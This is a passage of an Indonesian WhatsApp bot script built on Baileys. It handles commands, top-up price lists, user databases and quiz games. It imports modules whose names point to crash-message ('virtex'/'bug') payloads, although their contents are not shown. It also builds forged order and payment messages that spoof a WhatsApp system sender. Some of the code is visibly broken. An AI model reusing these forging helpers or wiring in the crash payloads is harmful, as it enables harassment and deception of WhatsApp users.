require('./all/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
require("./all/global")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, formatp,
googleTTS ,parseMention, getRandom, getGroupAdmins } = require('./all/myfunc')

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./scrape/uploader')
const speed = require('performance-now')
const hx = require('hxz-api')
const fdl = require("caliph-api")
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { Configuration, OpenAIApi } = require("openai");
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
let qwer = require("./key.json")
const { color, bgcolor } = require('./all/color')
const { uptotelegra } = require('./all/upload')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const ytdl = require("ytdl-core")
const { dateDatabase } = require('./lib/functions.js')
const { msgFilter } = require('./lib/antispam')
const { premium } = require('./lib/premium')
const { toAudio, toPTT, toVideo,}= require('./lib/converter')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { cttl } = require('./baseikal/virtex/cttl')
const { tizi } = require('./baseikal/virtex/tizi')
const { weg } = require('./baseikal/virtex/weg')
const { virtex7 } = require('./baseikal/virtex/virtex7')
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
const { mdelay } = require('./zetszet/virtex/mdelay.js')
const { stuck1 } = require('./zetszet/virtex/stuck1.js')
const { stuck2 } = require('./zetszet/virtex/stuck2.js')
const { stuck3 } = require('./zetszet/virtex/stuck3.js')
const { ios1 } = require('./zetszet/virtex/ios1.js')
const { ios2 } = require('./zetszet/virtex/ios2.js')
const { zovcgay } = require('./zetszet/virtex/zovcgay.js')
const { zetxdgay } = require('./zetszet/virtex/zetxdgay.js')
const { bugcapt } = require('./zetszet/virtex/bugcapt.js')
const { Client: WAWebClient, MessageType } = require('whatsapp-web.js');
const testimoni = JSON.parse(fs.readFileSync('./database/testimoni.json'))
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thumb = fs.readFileSync ('./thumb.png')
const ntnsfw = JSON.parse(fs.readFileSync('./all/database/nsfw.json'))
const pengguna = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const isPremium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isUser = pengguna.includes(m.sender)

module.exports = async (Biiofc, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isGroup = from.endsWith('@g.us')
const DigitalOcean = require('digitalocean');
const botNumber = await Biiofc.decodeJid(Biiofc.user.id)
const sender = m.key.fromMe ? (Biiofc.user.id.split(':')[0]+'@s.whatsapp.net' || Biiofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Biiofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const API_TOKEN = global.apitokendo;
const LINODE_API_TOKEN = global.apilinode;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const ffstalk = require('./scrape/ffstalk')
const scp1 = require('./scrape/scraper') 
const { Client } = require('ssh2');
const dns = require('dns');
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./all/database/deposit");
const { status, order_id, number, SMS } = JSON.parse(fs.readFileSync("./freya/status.json"))
const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const { remini } = require('./freya/remini')
const jsobfus = require('javascript-obfuscator')
const { mediafireDl } = require('./all/database/mediafire.js') 
const db_user = JSON.parse(fs.readFileSync('./freya/user.json'))
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
server = JSON.parse(fs.readFileSync('./database/server.json'))
const grups = JSON.parse(fs.readFileSync('./database/grups.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const qtod = m.quoted? "true":"false"
    let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}
//=================================================//
// read database
let tebaklagu = []
let _family100 = []
let kuismath =  []
let tebakgambar = []
let tebakkata = []
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
//=================================================//

//sewainbot
let sewa = {
rizalxdzzdev1: { nama: "1 Hari", harga: 5000, id: "rizalxdzzdev1" },
rizalxdzzdev2: { nama: "3 HARI", harga: 15000, id: "rizalxdzzdev2" },
rizalxdzzdev3: { nama: "5 HARI", harga: 25000, id: "rizalxdzzdev3" },
rizalxdzzdev4: { nama: "7 HARI", harga: 45000, id: "rizalxdzzdev4" },
rizalxdzzdev5: { nama: "10 HARI", harga: 55000, id: "rizalxdzzdev5" },
rizalxdzzdev6: { nama: "14 HARI", harga: 65000, id: "rizalxdzzdev6" },
rizalxdzzdev7: { nama: "21 HARI", harga: 75000, id: "rizalxdzzdev7" },
rizalxdzzdev8: { nama: "30 HARI", harga: 85000, id: "rizalxdzzdev8" },
rizalxdzzdev9: { nama: "UNLIMITED", harga: 95000, id: "rizalxdzzdev10" },
};
// LIST GG RIZAL STORE GMG BROH AOWKWOWKW

   // *⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST MOBILELEGENDS ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ml = {
ML3: { nama: "MOBILELEGEND - 3 Diamond", harga: 1500, id: "ML3" },
ML5: { nama: "MOBILELEGEND - 5 Diamond", harga: 1700, id: "ML5" },
ML11: { nama: "MOBILELEGEND - 11 Diamond", harga: 2900, id: "ML11" },
ML10: { nama: "MOBILELEGEND - 10 Diamond", harga: 3000, id: "ML10" },
ML12: { nama: "MOBILELEGEND - 12 Diamond", harga: 3500, id: "ML12" },
ML14: { nama: "MOBILELEGEND - 14 Diamond", harga: 3600, id: "ML14" },
ML15: { nama: "MOBILELEGEND - 15 Diamond", harga: 4500, id: "ML15" },
ML17: { nama: "MOBILELEGEND - 17 Diamond", harga: 4700, id: "ML17" },
ML19: { nama: "MOBILELEGEND - 19 Diamond", harga: 5400, id: "ML19" },
ML22: { nama: "MOBILELEGEND - 22 Diamond", harga: 5500, id: "ML22" },
ML20: { nama: "MOBILELEGEND - 20 Diamond", harga: 6000, id: "ML20" },
ML28: { nama: "MOBILELEGEND - 28 Diamond", harga: 7000, id: "ML28" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST DANA ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let dana = { 
DANA1: { nama: "DANA 1.000", harga: 2000, id: "DANA1" },
DANA2: { nama: "DANA 2.000", harga: 3000, id: "DANA2" },
DANA3: { nama: "DANA 3.000", harga: 4000, id: "DANA3" },
DANA4: { nama: "DANA 4.000", harga: 5000, id: "DANA4" },
DANA5: { nama: "DANA 5.000", harga: 6000, id: "DANA5" },
DANA6: { nama: "DANA 6.000", harga: 7000, id: "DANA6" },
DANA7: { nama: "DANA 7.000", harga: 8000, id: "DANA7" },
DANA8: { nama: "DANA 8.000", harga: 9000, id: "DANA8" },
DANA9: { nama: "DANA 9.000", harga: 10000, id: "DANA9" },
DANA10: { nama: "DANA 10.000", harga: 11000, id: "DANA10" },
DANA11: { nama: "DANA 11.000", harga: 12000, id: "DANA11" },
DANA12: { nama: "DANA 12.000", harga: 13000, id: "DANA12" },
DANA13: { nama: "DANA 13.000", harga: 14000, id: "DANA13" },
DANA14: { nama: "DANA 14.000", harga: 15000, id: "DANA14" },
DANA15: { nama: "DANA 15.000", harga: 16000, id: "DANA15" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST GOPAY ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let gopay = {
GOPAY1: { nama: "SALDO GOPAY 1.000", harga: 2500, id: "GOPAY1" },
GOPAY2: { nama: "SALDO GOPAY 2.000", harga: 3500, id: "GOPAY2" },
GOPAY3: { nama: "SALDO GOPAY 3.000", harga: 4500, id: "GOPAY3" },
GOPAY4: { nama: "SALDO GOPAY 4.000", harga: 5500, id: "GOPAY4" },
GOPAY5: { nama: "SALDO GOPAY 5.000", harga: 6500, id: "GOPAY5" },
GOPAY6: { nama: "SALDO GOPAY 6.000", harga: 7500, id: "GOPAY6" },
GOPAY7: { nama: "SALDO GOPAY 7.000", harga: 8500, id: "GOPAY7" },
GOPAY8: { nama: "SALDO GOPAY 8.000", harga: 9500, id: "GOPAY8" },
GOPAY9: { nama: "SALDO GOPAY 9.000", harga: 10500, id: "GOPAY9" },
GOPAY10: { nama: "SALDO GOPAY 10.000", harga: 11500, id: "GOPAY10" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST OVO ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ovo = {
OVO5: { nama: "SALDO OVO 5.000", harga: 6000, id: "OVO5" },
OVO10: { nama: "SALDO OVO 10.000", harga: 11500, id: "OVO10" },
OVO15: { nama: "SALDO OVO 15.000", harga: 16500, id: "OVO15" },
OVO20: { nama: "SALDO OVO 20.000", harga: 21500, id: "OVO20" },
OVO25: { nama: "SALDO OVO 25.000", harga: 26500, id: "OVO25" },
OVO30: { nama: "SALDO OVO 30.000", harga: 31500, id: "OVO30" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST  PUBG MOBILE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let pubg = {
PUBG15: { nama: "PUBG MOBILE 15 UC", harga: 3000, id: "PUBG15" },
PUBG16: { nama: "PUBG MOBILE 16 UC", harga: 3200, id: "PUBG" },
PUBG25: { nama: "PUBG MOBILE 25 UC", harga: 4500, id: "PUBG" },
PUBG26: { nama: "PUBG MOBILE 26 UC", harga: 5200, id: "PUBG" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST FREE FIRE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ff = {
FF5: { nama: "5 Diamond Free Fire", harga: 1000, id: "FF5" },
FF10: { nama: "10 Diamond Free Fire", harga: 2000, id: "FF10" },
FF12: { nama: "12 Diamond Free Fire", harga: 2100, id: "FF12" },
FF15: { nama: "15 Diamond Free Fire", harga: 2500, id: "FF15" },
FF20: { nama: "20 Diamond Free Fire", harga: 3300, id: "FF20" },
FF25: { nama: "25 Diamond Free Fire", harga: 4000, id: "FF25" },
FF30: { nama: "30 Diamond Free Fire", harga: 5000, id: "FF30" },
FF40: { nama: "40 Diamond Free Fire", harga: 5555, id: "FF40" },
FF50: { nama: "50 Diamond Free Fire", harga: 6233, id: "FF50" },
FF55: { nama: "55 Diamond Free Fire", harga: 7000, id: "FF55" },
FF60: { nama: "60 Diamond Free Fire", harga: 7700, id: "FF60" },
FF70: { nama: "70 Diamond Free Fire", harga: 9000, id: "FF70" },
FF75: { nama: "75 Diamond", harga: 9300, id: "FF75" },
FF90: { nama: "90 Diamond", harga: 11500, id: "FF90" },
};

//setuser
let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./riza/user.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))}
}})
}
const checkIdSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
const checkStsSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}
//BanUser
const banUser = await Biiofc.fetchBlocklist

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return Biiofc.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        
// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const premm = JSON.parse(fs.readFileSync("./all/database/premiumm.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isPremiumm = premm.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Biiofc.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
FN:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
Biiofc.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

if (isMedia && m.key.fileSha256 && (m.key.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: Biiofc.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Biiofc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Biiofc.ev.emit('messages.upsert', m.key)
}

// Push Message To Console && Auto Read
        if (m.message) {
            Biiofc.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
//func makeid
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
    charactersLength));
    }
    return result
}
function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
  }
      

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Biiofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Biiofc.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
Biiofc.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Wexxynnn🚷`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://bit.ly/WexxMy-id", 
"sourceUrl": "https://bit.ly/WexxMy-id" }}}, { quoted: m }) } 

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

// Pastikan Anda memiliki API token yang valid dari DigitalOcean dan disimpan dalam variabel API_TOKEN
const floc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        locationMessage: {
            nama: `${namaCreator}`,
            jpegThumbnail: fkethmb,
        }
    }
}

const cap = 'HW MODS WA'
const kalgans = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": thumb,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"RAFATHAR OFFCIAL\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {

console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))

return await Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
Biiofc.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
  Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
